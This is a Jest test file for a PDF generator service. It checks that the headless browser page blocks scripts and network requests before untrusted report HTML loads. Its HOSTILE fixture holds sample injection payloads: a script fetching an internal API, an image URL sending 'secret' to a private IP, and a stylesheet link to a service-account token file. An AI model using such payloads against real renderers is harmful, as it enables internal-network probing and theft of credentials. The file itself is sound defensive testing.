// pdf-generator.service.hardening.spec.ts
//
// `generatePDF` must lock the page before the report HTML reaches it. The
// browser here is a recording double that behaves like Chromium for what the
// test needs: with scripts on it runs every <script>, and every resource the
// HTML names becomes a request, which reaches the network unless an
// interception handler aborts it. The real-browser proof is
// `pdf-page-hardening.live.spec.ts`.

import { Logger } from 'nestjs-pino';

type RequestHandler = (request: {
  url(): string;
  isNavigationRequest(): boolean;
  abort(code?: string): Promise<void>;
  continue(): Promise<void>;
}) => void;

const state = {
  calls: [] as string[],
  network: [] as string[],
  scriptsRun: 0,
  launchArgs: [] as string[],
  // what `page.url()` answers once the content is set
  documentUrl: 'about:blank',
};

function fakePage() {
  let js = true;
  let intercept = false;
  let offline = false;
  const handlers: RequestHandler[] = [];
  const page = {
    setJavaScriptEnabled: async (v: boolean) => {
      state.calls.push(`setJavaScriptEnabled(${v})`);
      js = v;
    },
    setBypassServiceWorker: async (v: boolean) => {
      state.calls.push(`setBypassServiceWorker(${v})`);
    },
    setOfflineMode: async (v: boolean) => {
      state.calls.push(`setOfflineMode(${v})`);
      offline = v;
    },
    setRequestInterception: async (v: boolean) => {
      state.calls.push(`setRequestInterception(${v})`);
      intercept = v;
    },
    on: (event: string, handler: RequestHandler) => {
      if (event === 'request') handlers.push(handler);
      return page;
    },
    setContent: async (html: string) => {
      state.calls.push('setContent');
      if (js) {
        state.scriptsRun += (html.match(/<script\b/gi) ?? []).length;
      }
      const urls = [...html.matchAll(/(?:src|href)="([^"]+)"/g)].map(
        (m) => m[1],
      );
      for (const url of urls) {
        let decided: 'continue' | 'abort' | null = intercept
          ? null
          : 'continue';
        if (intercept) {
          for (const h of handlers) {
            h({
              url: () => url,
              isNavigationRequest: () => false,
              abort: async () => {
                decided = 'abort';
              },
              continue: async () => {
                decided = 'continue';
              },
            });
          }
          await Promise.resolve();
        }
        if (decided === 'continue' && !url.startsWith('data:') && !offline) {
          state.network.push(url);
        }
      }
    },
    url: () => state.documentUrl,
    evaluate: async () => undefined,
    waitForSelector: async () => undefined,
    pdf: async () => new Uint8Array([37, 80, 68, 70]),
  };
  return page;
}

jest.mock('puppeteer', () => ({
  __esModule: true,
  default: {
    launch: async (opts: { args: string[] }) => {
      state.launchArgs = opts.args;
      return {
        newPage: async () => fakePage(),
        close: async () => undefined,
      };
    },
  },
}));

import { PdfGeneratorService } from './pdf-generator.service';

const HOSTILE = `<!doctype html><html><body>
<script>fetch('http://internal-api:50051/internal')</script>
<img src="http://10.0.0.7:8080/steal?d=secret">
<link rel="stylesheet" href="file:///var/run/secrets/token">
<img src="data:image/png;base64,AAAA">
<div class="footer">f</div></body></html>`;

describe('PdfGeneratorService page hardening', () => {
  const logger = { log: jest.fn(), warn: jest.fn(), error: jest.fn() };
  const service = new PdfGeneratorService(logger as unknown as Logger);

  beforeEach(() => {
    state.calls = [];
    state.network = [];
    state.scriptsRun = 0;
    state.documentUrl = 'about:blank';
    jest.clearAllMocks();
  });

  it('runs no script and sends no request for a report that tries both', async () => {
    const pdf = await service.generatePDF(HOSTILE, {
      waitForSelector: '.footer',
    });
    expect(pdf.length).toBeGreaterThan(0);
    expect(state.scriptsRun).toBe(0);
    expect(state.network).toEqual([]);
  });

  it('locks the page before the HTML reaches it', async () => {
    await service.generatePDF(HOSTILE, { waitForSelector: '.footer' });
    const contentAt = state.calls.indexOf('setContent');
    for (const call of [
      'setJavaScriptEnabled(false)',
      'setBypassServiceWorker(true)',
      'setOfflineMode(true)',
      'setRequestInterception(true)',
    ]) {
      const at = state.calls.indexOf(call);
      expect(at).toBeGreaterThanOrEqual(0);
      expect(at).toBeLessThan(contentAt);
    }
  });

  it('logs the schemes it blocked, never a URL', async () => {
    await service.generatePDF(HOSTILE, { waitForSelector: '.footer' });
    const logged = [
      ...logger.log.mock.calls,
      ...logger.warn.mock.calls,
      ...logger.error.mock.calls,
    ]
      .map((c) => JSON.stringify(c))
      .join('\n');
    expect(logged).toContain('PDF_RENDER_REQUEST_BLOCKED');
    expect(logged).toContain('http:');
    expect(logged).not.toMatch(/10\.0\.0\.7|steal|secret|internal-api/);
  });

  it('refuses to print a page that is no longer the report', async () => {
    state.documentUrl = 'http://10.0.0.7:8080/landing?d=secret';
    await expect(
      service.generatePDF(HOSTILE, { waitForSelector: '.footer' }),
    ).rejects.toThrow(
      'PDF generation failed: the report page left its document',
    );
    const logged = JSON.stringify(logger.error.mock.calls);
    expect(logged).not.toMatch(/10\.0\.0\.7|landing|secret/);
  });

  it('never accepts a caller predicate to evaluate in the page', async () => {
    // the JavaScript-driven wait (Chart.js era) is gone: every template is
    // static, and a predicate would need scripts on
    await service.generatePDF(HOSTILE, {
      waitForSelector: '.footer',
      // @ts-expect-error the option no longer exists
      waitForFunction: 'window.chartsReady === true',
    });
    expect(state.calls).not.toContain('waitForFunction');
  });
});
